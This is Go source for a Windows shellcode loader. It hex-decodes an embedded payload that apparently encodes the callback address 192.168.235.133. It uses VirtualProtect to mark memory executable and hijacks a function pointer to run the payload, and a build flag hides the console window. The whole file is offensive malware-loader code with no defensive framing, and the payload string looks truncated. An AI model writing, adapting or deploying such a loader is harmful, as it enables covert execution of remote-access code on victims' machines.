package main

import (
	"encoding/hex"
	"log"
	"os"
	"syscall"
	"unsafe"
)

func main() {
	// go build -ldflags "-H windowsgui" -o main.exe
	var (
		shellcode = "fc4883e4f0e8c800003f84dd72c04989f941ba12968989ffdffff3139322e3136382e3233352e313333001969a08d"
	)
	sc, err := hex.DecodeString(shellcode)
	if err != nil {
		log.Println(err)
		os.Exit(1)
	}
	Inject(sc)
}

func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
	ret, _, _ := syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect").Call(
		uintptr(lpAddress),
		uintptr(dwSize),
		uintptr(flNewProtect),
		uintptr(lpflOldProtect))
	return ret > 0
}

func Inject(sc []byte) {
	exec := func() {}
	var shellgode uint32
	if !VirtualProtect(unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&exec))), unsafe.Sizeof(uintptr(0)), uint32(0x40), unsafe.Pointer(&shellgode)) {
		panic("Error")
	}

	**(**uintptr)(unsafe.Pointer(&exec)) = *(*uintptr)(unsafe.Pointer(&sc))

	var shellgod uint32
	if !VirtualProtect(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&sc))), uintptr(len(sc)), uint32(0x40), unsafe.Pointer(&shellgod)) {
		panic("Error")
	}
	exec()
}

